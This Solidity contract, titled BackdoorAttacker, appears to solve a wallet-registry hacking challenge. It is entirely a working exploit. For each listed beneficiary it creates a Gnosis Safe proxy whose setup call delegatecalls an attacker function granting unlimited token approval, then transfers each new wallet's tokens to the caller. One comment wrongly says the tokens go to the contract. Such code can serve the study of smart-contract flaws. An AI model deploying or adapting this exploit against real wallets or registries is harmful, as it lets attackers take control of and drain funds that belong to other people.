// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";

/**
 * @title BackdoorAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */

contract BackdoorAttacker {
    using SafeMath for uint;
    using Address for address;

    GnosisSafeProxyFactory immutable factory;

    address immutable singleton;

    IProxyCreationCallback immutable registry;

    IERC20   token;

    constructor (address _factory, address _singleton, address _token, address _registry) {
        factory = GnosisSafeProxyFactory(_factory);

        singleton = _singleton;

        token = IERC20 (_token);

        registry = IProxyCreationCallback(_registry);
    }

    function attack(address[] memory beneficiaries) external {

        //approve each beneficiary wallet to spend its balance
        for (uint256 i = 0 ; i < beneficiaries.length ; i++){
            address[] memory wallets = new address[](1);
            wallets[0] = beneficiaries[i];

            bytes memory moduleData = abi.encodeWithSignature("whatever(address,address)", token, address(this)); 

            string memory setUpSignature = "setup(address[],uint256,address,bytes,address,address,uint256,address)";

            bytes memory initializer = abi.encodeWithSignature(
                setUpSignature,
                wallets,
                uint256(1),
                address(this),
                moduleData,
                address(0), address(0), uint256(0), address(0));

            //create new proxy on behalf of each beneficiaries
            // _singleton : Address of singleton contract--> GnosisSafe
            // initializer : Payload for message call sent to new proxy contract.
            // saltNonce : Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
            // callback : Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
            GnosisSafeProxy proxy = factory.createProxyWithCallback(singleton, initializer, 113, registry);

            // send each beneficiary wallet's balance to this contract(which we declared as a module) 
            require(token.transferFrom(address(proxy), msg.sender, 10 ether), "transferFrom failed");
        }
    }

    //moduleData 
    function whatever(address _token, address attacker) external {
        IERC20(_token).approve(attacker, type(uint256).max);
    }

}
